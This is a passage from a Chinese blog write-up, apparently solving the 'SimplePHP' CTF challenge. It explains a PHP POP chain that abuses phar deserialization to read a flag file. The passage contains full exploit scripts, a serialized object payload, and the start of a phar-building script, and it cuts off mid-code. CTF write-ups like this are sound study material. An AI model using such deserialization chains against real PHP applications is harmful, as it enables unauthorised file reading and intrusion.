class="headerlink" title="危险函数:"></a>危险函数:</h4><p><img src="/images/2024-2-3-SimplePHP/image-20240131165937286.png" alt="image-20240131165937286"></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131165948278.png" alt="image-20240131165948278"></p><p>由于_show()函数只有在file.php中有使用，在class.php中没有其他地方有使用该函数，所以用该函数进行pop链不理想，所以我们尝试用pop链触发file_get()函数</p><h2 id="构造phar反序化"><a href="#构造phar反序化" class="headerlink" title="构造phar反序化:"></a>构造phar反序化:</h2><h3 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析:"></a>pop链分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.$text = base64_encode(file_get_contents($value));<br>$value=f1ag.php<br><br>2.Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>$value=f1ag.php<br><br>3.Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br><br>4.Test::__get($key)<br>=&gt;Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br><br>5.要触发__get()函数，需要调用该类的私有变量或不存在的变量时，才会调用<br>Show::__toString()=&gt;$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;<br>=&gt;Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>Show-&gt;str[&#x27;str&#x27;]=new Test<br>$key=&#x27;source&#x27;<br>params=array(&#x27;source&#x27;=&gt;&#x27;f1ag.php&#x27;)<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br><br>6.要触发__toString()函数，当输出引用该函数所在的对象时，或对类进行字符串处理时会自动调用该函数，同样由于我们获取的f1ag.php信息是通过return返回的，所以我们需要有一个输出echo或print去输出我们获取到的f1ag.php文件信息，所以考虑采用C1e4r::__destruct()=&gt;echo $this-&gt;test;//$this-&gt;test = new Show()<br>C1e4r::__destruct()=&gt;echo $this-&gt;test;<br>=&gt;Show::__toString()=&gt;$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;<br>=&gt;Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>C1e4r-&gt;str = new Show()<br>C1e4r-&gt;test = new Show()<br>Show-&gt;str[&#x27;str&#x27;]=new Test<br>$key=&#x27;source&#x27;<br>params=array(&#x27;source&#x27;=&gt;&#x27;f1ag.php&#x27;)<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br></code></pre></td></tr></table></figure><h3 id="构造pop链脚本"><a href="#构造pop链脚本" class="headerlink" title="构造pop链脚本:"></a>构造pop链脚本:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 该函数可以直接展示指定目录的文件信息，可以进行利用</span><br>            <span class="hljs-comment">// 但是我们需要绕过preg_mathch()的检测</span><br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 存在文件打开函数，可以用于获取文件信息</span><br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;f1ag.php&#x27;</span>);<br><span class="hljs-variable">$name</span>-&gt;str=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;str&#x27;</span>=&gt;<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>(<span class="hljs-variable">$name</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-comment">// @unserialize($a);</span><br><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="输出"><a href="#输出" class="headerlink" title="输出:"></a>输出:</h4><p><img src="/images/2024-2-3-SimplePHP/image-20240131181102991.png" alt="image-20240131181102991"></p><h4 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密:"></a>base64解密:</h4><p><img src="/2024/02/03/2024-2-3-SimplePHP/Typora_images\image-20240131181118458.png" alt="image-20240131181118458"></p><h4 id="反序列化测试"><a href="#反序列化测试" class="headerlink" title="反序列化测试:"></a>反序列化测试:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 该函数可以直接展示指定目录的文件信息，可以进行利用</span><br>            <span class="hljs-comment">// 但是我们需要绕过preg_mathch()的检测</span><br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 存在文件打开函数，可以用于获取文件信息</span><br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;f1ag.php&#x27;</span>);<br><span class="hljs-variable">$name</span>-&gt;str=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;str&#x27;</span>=&gt;<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>(<span class="hljs-variable">$name</span>);<br><br><span class="hljs-comment">// $a = serialize($a);</span><br><span class="hljs-comment">// echo $a;</span><br><span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;O:5:&quot;C1e4r&quot;:2:&#123;s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:&#123;s:6:&quot;source&quot;;s:8:&quot;f1ag.php&quot;;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);<br><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出:"></a>输出:</h5><p><img src="/images/2024-2-3-SimplePHP/image-20240131181309988.png" alt="image-20240131181309988"></p><p>总共有两次base64输出，第一次为自动销毁对象时触发，第二次为unserialize()时触发产生，所以可以证明我们的序列化操作正确。</p><p><strong>serialize序列化和phar序列化的运行原理基本基本一直，只是触发的方式不相同，所以可以使用普通的序列化来测试pop链的正确性</strong></p><h3 id="构造phar序列化文件脚本"><a href="#构造phar序列化文件脚本" class="headerlink" title="构造phar序列化文件脚本:"></a>构造phar序列化文件脚本:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable 